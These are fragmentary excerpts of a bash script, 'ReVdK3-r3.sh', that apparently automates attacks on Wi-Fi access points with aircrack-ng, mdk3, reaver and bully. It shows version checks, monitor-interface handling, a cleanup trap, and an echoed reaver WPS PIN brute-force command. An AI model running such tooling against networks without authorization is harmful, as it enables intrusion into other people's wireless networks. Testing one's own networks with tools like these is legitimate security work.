...
echo -e "\e[36m\e[1m#####################################################################\e[0m";
echo ;
echo  -e "\e[37m\e[44m\e[1m ReVdK3.sh-r3 (Revision 3)\e[0m";
echo ;
...
if [[ `aircrack-ng|grep 'Aircrack-ng 1.2 rc2'`  ]]; then 
...
if [[ `aircrack-ng|grep 'Aircrack-ng 1.2 rc2'`  ]]; then 
PHY_OF_WLAN_1=`airmon-ng|grep ''"$WLAN"|awk '{print $1}'`;
else 
PHY_OF_WLAN_1=`airmon-ng|grep $WLAN|cut -d ' ' -f4`;
fi
if ! [[ `aircrack-ng|grep 'Aircrack-ng 1.2 rc2'`  ]]; then 
...
killall -1 ReVdK3-r3.sh;killall mdk3 2> /dev/null; killall -9 reaver 2> /dev/null;killall -9 bully 2> /dev/null; killall tail 2> /dev/null; rm -f /etc/reaver_tmp.txt 2>/dev/null;
rm -f /etc/bully_tmp.txt 2>/dev/null; airmon-ng stop "$MON1" >/dev/null; airmon-ng stop "$MON2" >/dev/null; airmon-ng stop "$MON3" >/dev/null; 
killall aireplay-ng 2>/dev/null;rm -f /etc/aireplay_tmp.txt 2>/dev/null;killall -9 ReVdK3-r3.sh 2>/dev/null;xterm -e "kill $$"' SIGHUP SIGINT EXIT
clear
...
echo "reaver -i $WLAN -b $MAC -S -d $DISTANCE_BETWEEN_PINS -t $TIMEOUT -l 10 -N -vv";
